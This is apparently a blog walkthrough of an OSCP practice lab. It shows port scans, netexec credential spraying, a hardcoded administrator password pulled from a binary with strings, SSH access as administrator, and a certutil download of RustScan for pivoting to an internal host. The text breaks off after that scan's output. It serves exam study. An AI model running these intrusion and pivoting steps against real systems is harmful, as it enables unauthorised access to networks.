---
title: OSCP C
date: 2026-06-30
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - Lateral-Movement-Account-Verify-RustScan
  - Lateral-Movement-NXC
  - Port21-FTP-burteforce
  - CMS-vesta-RCE-auth
  - Port21-FTP-Burteforce
  - CMS-Usermin-RCE
  - Linux-Privilege-Escalation-Linux-smart-enumeration
  - Windows-Privilege-Escalation-PrivscCheck
  - Windows-Privilege-Service-premission
  - offsec
  - Window-Credential-checklist-manual
lastmod: 2026-07-06T13:59:36.119Z
---
# Box Info

This lab guides learners through an Active Directory exploitation chain, beginning with credential discovery in a SQLite database on an exposed web server. By cracking the credentials, learners gain access to an internal system via WinRM, escalate privileges through binary analysis and pivoting, and extract the domain administrator hash to achieve full domain compromise.

Here is the information formatted into a clean markdown table for easy scanning and reference.

### **Machine Credential Tracker**

| **ID**   | **IP Address**    | **Credentials**                    |
| -------- | ----------------- | ---------------------------------- |
| **IP 1** | `10.10.135.152`   | *None provided*                    |
| **IP 2** | `192.168.135.153` | `Eric.Wallows:EricLikesRunning800` |
| **IP 3** | 10.10.135.154     | *None provided*                    |
| **IP 4** | 192.168.135.156   | *None provided*                    |
| **IP 5** | 192.168.135.157   | *None provided*                    |
| **IP 6** | 192.168.135.155   | *None provided*                    |

***

# Recon IP 2

### PORT & IP SCAN

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.135.153 -oN serviceScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 17:46 HKT
Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.12% done; ETC: 17:47 (0:00:05 remaining)
Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.12% done; ETC: 17:48 (0:00:05 remaining)
Nmap scan report for 192.168.135.153
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-07-01T17:49:28+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-06-30T17:34:12
|_Not valid after:  2036-06-28T17:34:12
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-open-proxy: Proxy might be redirecting requests
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-01T17:49:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.03 seconds

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $nxc smb 192.168.135.153  --generate-hosts-file  hosts
SMB         192.168.135.153 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $cat hosts
192.168.135.153     MS01.oscp.exam MS01
```

### Cred Test

```
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto MS01.oscp.exam -u 'Eric.Wallows' -p 'EricLikesRunning800'; done
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto MS01.oscp.exam -u 'Eric.Wallows' -p 'EricLikesRunning800'; done

[*] Testing smb...
SMB         192.168.135.153 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.135.153 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 

[*] Testing winrm...
WINRM       192.168.135.153 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam) 
WINRM       192.168.135.153 5985   MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)

[*] Testing wmi...
RPC         192.168.135.153 135    MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
RPC         192.168.135.153 135    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 

[*] Testing rdp...

[*] Testing ssh...
SSH         192.168.135.153 22     MS01.oscp.exam   [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         192.168.135.153 22     MS01.oscp.exam   [+] Eric.Wallows:EricLikesRunning800 (Pwn3d!) with UAC - Windows - Shell access!

[*] Testing ldap...

[*] Testing mssql...

[*] Testing ftp...

```

### SMB

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $nxc smb MS01.oscp.exam -u 'Eric.Wallows' -p 'EricLikesRunning800'  --shares
SMB         192.168.135.153 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.135.153 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         192.168.135.153 445    MS01             [*] Enumerated shares
SMB         192.168.135.153 445    MS01             Share           Permissions     Remark
SMB         192.168.135.153 445    MS01             -----           -----------     ------
SMB         192.168.135.153 445    MS01             ADMIN$                          Remote Admin
SMB         192.168.135.153 445    MS01             C$                              Default share
SMB         192.168.135.153 445    MS01             IPC$            READ            Remote IPC
SMB         192.168.135.153 445    MS01             setup           READ            

```

The setup is not suppose in here

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $nxc smb MS01.oscp.exam -u 'Eric.Wallows' -p 'EricLikesRunning800' --spider 'setup' --regex .
SMB         192.168.135.153 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.135.153 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         192.168.135.153 445    MS01             [*] Spidering .
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/. [dir]
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/.. [dir]
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/Autologon64.exe [lastm:'2022-11-14 22:28' size:441224]
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/clean.ps1 [lastm:'2022-11-11 15:21' size:487]
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/sql.exe [lastm:'2022-11-10 19:11' size:261082544]
SMB         192.168.135.153 445    MS01             //192.168.135.153/setup/studio.exe [lastm:'2022-11-10 18:30' size:709679272]

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $smbclient //MS01.oscp.exam/setup -U Eric.Wallows
Password for [WORKGROUP\Eric.Wallows]:
session setup failed: NT_STATUS_LOGON_FAILURE

```

### winrm

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $evil-winrm-py -i MS01.oscp.exam  -u Eric.Wallows  -p EricLikesRunning800
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'MS01.oscp.exam:5985' as 'Eric.Wallows'
evil-winrm-py PS C:\Users\eric.wallows\Documents>

```

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

### admintools

```
evil-winrm-py PS C:\Users\eric.wallows> tree /f  .
Folder PATH listing
Volume serial number is 00000022 3C99:887F
C:\USERS\ERIC.WALLOWS
³   admintool.exe
³   
ÃÄÄÄDesktop
ÃÄÄÄDocuments
ÃÄÄÄDownloads
ÃÄÄÄFavorites
ÃÄÄÄLinks
ÃÄÄÄMusic
ÃÄÄÄPictures
ÃÄÄÄSaved Games
ÀÄÄÄVideos

```

```
evil-winrm-py PS C:\Users\eric.wallows> ./admintool.exe
error: The following required arguments were not provided:
    <CMD>
System.Management.Automation.RemoteException
USAGE:
    admintool.exe <CMD>
System.Management.Automation.RemoteException
For more information try --help
evil-winrm-py PS C:\Users\eric.wallows> ./admintool.exe whoami
Enter administrator password:
thread 'main' panicked at 'called `Option::unwrap()` on a `None` value', src/main.rs:75:20
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $strings admintool.exe | grep -i -E "pass|admin|cred|secret"
admintooH
administJ
administratorDecember31Enter administrator password:
Wrong administrator password!
Executing command  as administrator
admintoolcmd
Command::get_arg_conflicts_with: The passed arg conflicts with an arg unknown to the cmd
Command::get_arg_conflicts_with: The passed arg conflicts with an arg unknown to the cmd
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gimli-0.25.0\src\read\line.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read\coff\symbol.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\addr2line-0.16.0\src\lib.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\addr2line-0.16.0\src\function.rs
GlobalOrganizationLocalSiteLocalAdminLocalRealmLocalLinkLocalInterfaceLocalSocketV6SocketV4SocketIpv6Ipv4IpAddrParseError
strings passed to WinAPI cannot contain NULs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read\archive.rs
Invalid COFF/PE section indexC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read\coff\section.rs]
needle must be at least 2 bytesC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\prefilter\genericsimd.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\prefilter\x86\sse.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\prefilter\mod.rs
<prefilter-fn(...)>C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\rabinkarp.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\rarebytes.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\twoway.rs
internal error: entered unreachable codeC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\x86\avx.rs
haystack too smallC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\genericsimd.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\x86\sse.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memmem\mod.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gimli-0.25.0\src\read\abbrev.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gimli-0.25.0\src\read\value.rs
DW_AT_APPLE_propertyDW_AT_APPLE_objc_complete_typeDW_AT_APPLE_property_attributeDW_AT_APPLE_property_setterDW_AT_APPLE_property_getterDW_AT_APPLE_property_nameDW_AT_APPLE_omit_frame_ptrDW_AT_APPLE_runtime_classDW_AT_APPLE_major_runtime_versDW_AT_APPLE_blockDW_AT_APPLE_isaDW_AT_APPLE_flagsDW_AT_APPLE_optimizedDW_AT_LLVM_isysrootDW_AT_LLVM_config_macrosDW_AT_LLVM_include_pathDW_AT_BORLAND_closureDW_AT_BORLAND_Delphi_frameptrDW_AT_BORLAND_Delphi_returnDW_AT_BORLAND_Delphi_ABIDW_AT_BORLAND_Delphi_interfaceDW_AT_BORLAND_Delphi_anonymous_methodDW_AT_BORLAND_Delphi_destructorDW_AT_BORLAND_Delphi_constructorDW_AT_BORLAND_Delphi_metaclassDW_AT_BORLAND_Delphi_recordDW_AT_BORLAND_Delphi_classDW_AT_BORLAND_Delphi_unitDW_AT_BORLAND_property_defaultDW_AT_BORLAND_property_indexDW_AT_BORLAND_property_implementsDW_AT_BORLAND_property_writeDW_AT_BORLAND_property_readDW_AT_PGI_lstrideDW_AT_PGI_soffsetDW_AT_PGI_lbaseDW_AT_upc_threads_scaledDW_AT_GNU_biasDW_AT_GNU_denominatorDW_AT_GNU_numeratorDW_AT_GNAT_descriptive_typeDW_AT_use_GNAT_descriptive_typeDW_AT_ALTIUM_loclistDW_AT_SUN_fortran_basedDW_AT_SUN_fortran_main_aliasDW_AT_SUN_is_omp_child_funcDW_AT_SUN_namelist_specDW_AT_SUN_f90_use_onlyDW_AT_SUN_import_by_lnameDW_AT_SUN_dtor_state_deltasDW_AT_SUN_dtor_state_finalDW_AT_SUN_dtor_state_initialDW_AT_SUN_dtor_lengthDW_AT_SUN_dtor_startDW_AT_SUN_return_value_ptrDW_AT_SUN_c_vlaDW_AT_SUN_f90_assumed_shape_arrayDW_AT_SUN_f90_allocatableDW_AT_SUN_pass_by_refDW_AT_SUN_f90_pointerDW_AT_SUN_import_by_nameDW_AT_SUN_return_with_constDW_AT_SUN_pass_with_constDW_AT_SUN_link_nameDW_AT_SUN_part_link_nameDW_AT_SUN_amd64_parmdumpDW_AT_SUN_hwcprof_signatureDW_AT_SUN_original_nameDW_AT_SUN_obj_fileDW_AT_SUN_obj_dirDW_AT_SUN_memop_signatureDW_AT_SUN_profile_idDW_AT_SUN_memop_type_refDW_AT_SUN_func_offsetDW_AT_SUN_omp_child_funcDW_AT_SUN_omp_tpriv_addrDW_AT_SUN_vtable_indexDW_AT_SUN_cf_kindDW_AT_SUN_func_offsetsDW_AT_SUN_vtable_abiDW_AT_SUN_browser_fileDW_AT_SUN_languageDW_AT_SUN_compile_optionsDW_AT_SUN_vbaseDW_AT_SUN_command_lineDW_AT_SUN_count_guaranteeDW_AT_SUN_vtableDW_AT_SUN_alignmentDW_AT_SUN_templateDW_AT_GNU_entry_viewDW_AT_GNU_locviewsDW_AT_GNU_discriminatorDW_AT_GNU_pubtypesDW_AT_GNU_pubnamesDW_AT_GNU_addr_baseDW_AT_GNU_ranges_baseDW_AT_GNU_dwo_idDW_AT_GNU_dwo_nameDW_AT_GNU_macrosDW_AT_GNU_all_source_call_sitesDW_AT_GNU_all_call_sitesDW_AT_GNU_all_tail_call_sitesDW_AT_GNU_tail_callDW_AT_GNU_call_site_target_clobberedDW_AT_GNU_call_site_targetDW_AT_GNU_call_site_data_valueDW_AT_GNU_call_site_valueDW_AT_GNU_template_nameDW_AT_GNU_odr_signatureDW_AT_GNU_shared_locks_requiredDW_AT_GNU_exclusive_locks_requiredDW_AT_GNU_locks_excludedDW_AT_GNU_pt_guardedDW_AT_GNU_guardedDW_AT_GNU_pt_guarded_byDW_AT_GNU_guarded_byDW_AT_GNU_vectorDW_AT_body_endDW_AT_body_beginDW_AT_src_coordsDW_AT_mac_infoDW_AT_src_infoDW_AT_sf_namesDW_AT_INTEL_other_endianDW_AT_MIPS_assumed_sizeDW_AT_MIPS_assumed_shape_dopetypeDW_AT_MIPS_allocatable_dopetypeDW_AT_MIPS_ptr_dopetypeDW_AT_MIPS_stride_elemDW_AT_MIPS_stride_byteDW_AT_MIPS_has_inlinesDW_AT_MIPS_clone_originDW_AT_MIPS_abstract_nameDW_AT_MIPS_strideDW_AT_MIPS_linkage_nameDW_AT_MIPS_software_pipeline_depthDW_AT_MIPS_loop_unroll_factorDW_AT_MIPS_epilog_beginDW_AT_MIPS_tail_loop_beginDW_AT_MIPS_loop_beginDW_AT_MIPS_fdeDW_AT_hi_userDW_AT_lo_userDW_AT_loclists_baseDW_AT_defaultedDW_AT_deletedDW_AT_export_symbolsDW_AT_alignmentDW_AT_noreturnDW_AT_call_data_valueDW_AT_call_data_locationDW_AT_call_target_clobberedDW_AT_call_targetDW_AT_call_tail_callDW_AT_call_pcDW_AT_call_parameterDW_AT_call_originDW_AT_call_valueDW_AT_call_return_pcDW_AT_call_all_tail_callsDW_AT_call_all_source_callsDW_AT_call_all_callsDW_AT_macrosDW_AT_rvalue_referenceDW_AT_referenceDW_AT_dwo_nameDW_AT_rnglists_baseDW_AT_addr_baseDW_AT_str_offsets_baseDW_AT_rankDW_AT_string_length_byte_sizeDW_AT_string_length_bit_sizeDW_AT_linkage_nameDW_AT_enum_classDW_AT_const_exprDW_AT_data_bit_offsetDW_AT_main_subprogramDW_AT_signatureDW_AT_recursiveDW_AT_pureDW_AT_elementalDW_AT_endianityDW_AT_object_pointerDW_AT_explicitDW_AT_threads_scaledDW_AT_mutableDW_AT_picture_stringDW_AT_digit_countDW_AT_decimal_signDW_AT_smallDW_AT_decimal_scaleDW_AT_binary_scaleDW_AT_descriptionDW_AT_call_lineDW_AT_call_fileDW_AT_call_columnDW_AT_trampolineDW_AT_rangesDW_AT_extensionDW_AT_use_UTF8DW_AT_entry_pcDW_AT_byte_strideDW_AT_data_locationDW_AT_associatedDW_AT_allocatedDW_AT_vtable_elem_locationDW_AT_virtualityDW_AT_variable_parameterDW_AT_use_locationDW_AT_typeDW_AT_static_linkDW_AT_specificationDW_AT_segmentDW_AT_priorityDW_AT_namelist_itemDW_AT_macro_infoDW_AT_identifier_caseDW_AT_friendDW_AT_frame_baseDW_AT_externalDW_AT_encodingDW_AT_discr_listDW_AT_declarationDW_AT_decl_lineDW_AT_decl_fileDW_AT_decl_columnDW_AT_data_member_locationDW_AT_countDW_AT_calling_conventionDW_AT_base_typesDW_AT_artificialDW_AT_address_classDW_AT_accessibilityDW_AT_abstract_originDW_AT_upper_boundDW_AT_bit_strideDW_AT_start_scopeDW_AT_return_addrDW_AT_prototypedDW_AT_producerDW_AT_lower_boundDW_AT_is_optionalDW_AT_inlineDW_AT_default_valueDW_AT_containing_typeDW_AT_const_valueDW_AT_comp_dirDW_AT_common_referenceDW_AT_string_lengthDW_AT_importDW_AT_visibilityDW_AT_discr_valueDW_AT_discrDW_AT_languageDW_AT_high_pcDW_AT_low_pcDW_AT_stmt_listDW_AT_bit_sizeDW_AT_bit_offsetDW_AT_byte_sizeDW_AT_orderingDW_AT_nameDW_AT_locationDW_AT_siblingDW_AT_nullDwAt
DW_CC_hi_userDW_CC_lo_userDW_CC_pass_by_valueDW_CC_pass_by_referenceDW_CC_nocallDW_CC_programDW_CC_normalDwCc
_ZNC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\rustc-demangle-0.1.21\src\legacy.rs
_RC:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\rustc-demangle-0.1.21\src\v0.rs
.llvm.C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\rustc-demangle-0.1.21\src\lib.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\hashbrown-0.12.3\src\raw\mod.rs
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gimli-0.25.0\src\read
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gimli-0.25.0\src
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\addr2line-0.16.0\src
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read\pe
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\object-0.26.2\src\read\coff
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memchr\x86
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\memchr
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0\src\lib.rs\@\memchr.63d985d6-cgu.0
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\memchr-2.5.0
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\rustc-demangle-0.1.21\src\lib.rs\@\rustc_demangle.6874ac39-cgu.0
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\rustc-demangle-0.1.21
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\hashbrown-0.12.3\src\lib.rs\@\hashbrown.840829e2-cgu.0
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\hashbrown-0.12.3
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79\src\lib.rs\@\compiler_builtins.cf310d01-cgu.108
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79\src\lib.rs\@\compiler_builtins.cf310d01-cgu.120
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79\src\lib.rs\@\compiler_builtins.cf310d01-cgu.3
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\compiler_builtins-0.1.79
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
admintool.8b04
_ZN4core3ptr226drop_in_place$LT$clap..builder..arg..Arg..validator$LT$$LT$admintool..Cli$u20$as$u20$clap..derive..Args$GT$..augment_args..$u7b$$u7b$closure$u7d$$u7d$$C$$LP$$RP$$C$core..convert..Infallible$GT$..$u7b$$u7b$closure$u7d$$u7d$$GT$17hdbaeaa934084e54cE
_ZN4core3ptr35drop_in_place$LT$admintool..Cli$GT$17h315fcf8495796c4eE
_ZN9admintool4main17h28d95865f1eff324E

```

```
evil-winrm-py PS C:\Users\eric.wallows> echo December31 | ./admintool.exe whoami
Enter administrator password:
Executing command whoami as administrator
evil-winrm-py PS C:\Users\eric.wallows> echo Dember31 | ./admintool.exe whoami
Enter administrator password:
thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"86e1e040ab966535c9ff144d3a313387"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

```

### ssh

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto MS01.oscp.exam -u 'administrator' -p 'December31'; done

[*] Testing smb...
SMB         192.168.135.153 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.135.153 445    MS01             [-] oscp.exam\administrator:December31 STATUS_LOGON_FAILURE 

[*] Testing winrm...
WINRM       192.168.135.153 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam) 
WINRM       192.168.135.153 5985   MS01             [-] oscp.exam\administrator:December31

[*] Testing wmi...
RPC         192.168.135.153 135    MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
RPC         192.168.135.153 135    MS01             [-] oscp.exam\administrator:December31 (RPC_S_ACCESS_DENIED)

[*] Testing rdp...

[*] Testing ssh...
SSH         192.168.135.153 22     MS01.oscp.exam   [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         192.168.135.153 22     MS01.oscp.exam   [+] administrator:December31 (Pwn3d!) Windows - Shell access!

[*] Testing ldap...

[*] Testing mssql...

[*] Testing ftp...

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $ssh administrator@192.168.135.153

```

# Recon IP 3

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $ssh administrator@192.168.135.153

```

```

administrator@MS01 C:\Users\Administrator>ping 10.10.135.152

Pinging 10.10.135.152 with 32 bytes of data:       
Reply from 10.10.135.152: bytes=32 time<1ms TTL=128
Reply from 10.10.135.152: bytes=32 time<1ms TTL=128
Reply from 10.10.135.152: bytes=32 time<1ms TTL=128
Reply from 10.10.135.152: bytes=32 time<1ms TTL=128     

Ping statistics for 10.10.135.152:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds: 
    Minimum = 0ms, Maximum = 0ms, Average = 0ms


administrator@MS01 C:\Users\Administrator>ping 10.10.135.154 

Pinging 10.10.135.154 with 32 bytes of data:
Reply from 10.10.135.154: bytes=32 time=4ms TTL=128
Reply from 10.10.135.154: bytes=32 time<1ms TTL=128
Reply from 10.10.135.154: bytes=32 time<1ms TTL=128
Reply from 10.10.135.154: bytes=32 time<1ms TTL=128

Ping statistics for 10.10.135.154:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 4ms, Average = 1ms

```

### RustScan

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Account-Verify-RustScan" >}} In internal windows using the RustScan to discover the port

{{< /toggle >}}

download the exe file

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $wget https://github.com/bee-san/RustScan/releases/download/2.4.1/x86_64-windows-rustscan.exe.zip
--2026-07-02 00:56:09--  https://github.com/bee-san/RustScan/releases/download/2.4.1/x86_64-windows-rustscan.exe.zip

```

open the server

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo python3 -m http.server 80
[sudo] password for tester: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

unzip the file

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $unzip  x86_64-windows-rustscan.exe.zip
Archive:  x86_64-windows-rustscan.exe.zip
  inflating: rustscan.exe    
```

```
PS C:\Users\Administrator> certutil -urlcache -split -f http://192.168.45.161:80/rustscan.exe  C
:\ProgramData\rustscan.exe
****  Online  ****
  000000  ...
  429800
CertUtil: -URLCache command completed successfully.

```

execute the exe

```
PS C:\Users\Administrator> C:\ProgramData\rustscan.exe -a 10.10.135.152 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "C:\\Users\\Administrator\\.rustscan.toml"
Open 10.10.135.152:53
Open 10.10.135.152:88
Open 10.10.135.152:135
Open 10.10.135.152:139
Open 10.10.135.152:389
Open 10.10.135.152:445
Open 10.10.135.152:464
Open 10.10.135.152:593
Open 10.10.135.152:636
Open 10.10.135.152:3268
Open 10.10.135.152:3269
Open 10.10.135.152:5985
Open 10.10.135.152:5986
Open 10.10.135.152:9389
Open 10.10.135.152:49667
Open 10.10.135.152:49673
